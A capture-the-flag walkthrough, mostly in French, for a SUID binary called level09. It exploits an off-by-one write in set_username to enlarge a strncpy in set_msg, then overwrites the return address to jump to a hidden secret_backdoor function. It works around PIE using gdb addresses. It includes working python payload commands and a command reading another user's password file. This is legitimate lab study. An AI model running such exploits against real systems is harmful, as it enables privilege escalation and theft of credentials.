Le programme appelle 2 fonctions a le suite nous demandant des inputs. on se rend compte que dans le username, on copie 41 octets, il est donc possible de modifier la valeur de v7 qui est aussi la valeur donnee au strncpy de set_msg.
On peut donc strcpy jusqu'a 255 caracteres, ce qui nous permet de changer l'EIP pour jump sur la fonction secret_backdoor.

# Walkthrough - level09

The program has SUID permissions from the user `end`, which will allow us to obtain their flag.

# Dissassembly

- Lorsqu'on check les securites on remarque que PIE est enabled
- Le main appelle une fonction handle_msg qui appelle elle-meme deux fonctions set_username et set_msg
- Il y a une fonction secret_backdoor dans le fichier non appelee permettant de faire un appel a system en lisant depuis l'entree standard

# Exploit

L'objectif est de reecrire l'EIP de la frame de handle_msg pour qu'il pointe sur la fonction secret_backdoor.
Dans la fonction set_msg, on lit 1024 octets sur l'entree standard mais seuls les `*(v1 + 180)` soit la valeur de `v7` sont pris en compte.
On remarque dans le set_username que l'on ecrit 41 octets a partir de `v1 + 140`. On peut donc reecrire l'octet de poids faible de `v7` jusqu'a un maximum de `0xff` soit 255.

On essaye alors de voir si on peut segfault avec 255 caracteres ecrits dans le strncpy de set_msg.
```bash
(python -c 'print("\xff" * 41)'; python -c 'print("A" * 255)') | ./level09
```

On arrive effectivement a faire segfault, on calcule alors notre offset avec le buffer overflow pattern generator et on obtient 200.

On souhaite maintenant trouver l'addresse de la fonction secret_backdoor :
```bash
gdb ./level09
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>
```

Il nous reste alors a entrer l'addresse de la fonction secret_backdoor apres l'offset et afficher le mot de passe de `end` :
```bash
(python -c 'print("\xff" * 41)'; python -c 'print("A" * 200 + "\x8c\x08\x00\x00\x00\x00\x00\x00")'; echo "cat /home/users/end/.pass" ) | ./level09
```

Cela ne fonctionne pas a cause du PIE. Le PIE est une securite qui va charger le programme a un endroit different a chaque execution.
Cependant, on observe qu'en lancant le programme dans gdb l'offset donne par le PIE est constant. En effet, la fonction de randomisation de l'offset donne par PIE appelee ASLR ne semble pas enabled. L'offset est donc toujours le meme, on peut ainsi recuperer l'addresse des fonctions dans gdb durant l'execution du programme :
```bash
gdb ./level09
(gdb) b main
(gdb) run
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

On peut alors executer a nouveau la commande precedente avec notre nouvelle addresse :
```bash
(python -c 'print("\xff" * 41)'; python -c 'print("A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo "cat /home/users/end/.pass" ) | ./level09
```
